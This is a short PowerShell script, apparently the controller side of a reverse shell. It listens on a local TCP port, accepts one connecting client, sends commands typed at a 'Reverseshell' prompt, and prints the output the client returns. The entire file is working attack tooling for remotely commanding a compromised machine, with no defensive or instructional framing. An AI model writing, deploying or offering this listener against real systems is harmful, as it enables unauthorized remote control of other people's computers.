$listener = New-Object System.Net.Sockets.TcpListener("127.0.0.1",5555)  
$Listener.Start()
Write-Host "Sesion iniciada..." 

$Client = $Listener.AcceptTcpClient()
Write-Host "Cliente conectado..." 

$Stream = $Client.GetStream()
$Writer = New-Object System.IO.StreamWriter($Stream)
$Buffer = New-Object System.Byte[] 600
do {
	do {
	Write-Host "XxrrxX-Reverseshell#-> " -NoNewLine
 	$Comando = Read-host
	} While ( $Comando -eq "" )
	$Writer.Write("$Comando")
	$Writer.Flush()
	if ( $Comando -eq "exit") { break }

	$RecvBytes  = $Stream.Read($Buffer, 0, $Buffer.Length)
	$RemoteCount = [System.Text.Encoding]::UTF8.GetString($Buffer,0,$RecvBytes)	
	$Writer.Write("OK")
	$Writer.Flush()
	
	$LocalCount = 0
	
	while ( $LocalCount -ne $RemoteCount ) {

	$RecvBytes = $Stream.Read($Buffer,0,$Buffer.Length)
	$Output = [System.Text.Encoding]::UTF8.GetString($Buffer,0,$RecvBytes)
	Write-Host $Output 
	$LocalCount += $Output.Length
 }
	if ( !$Output.EndsWith("`n")) { Write-Host "`n" }
}while ($True)

$Writer.Close()
$Stream.Close()
$Client.Close()

$Listener.Stop
Write-Host "Sesion terminada..." 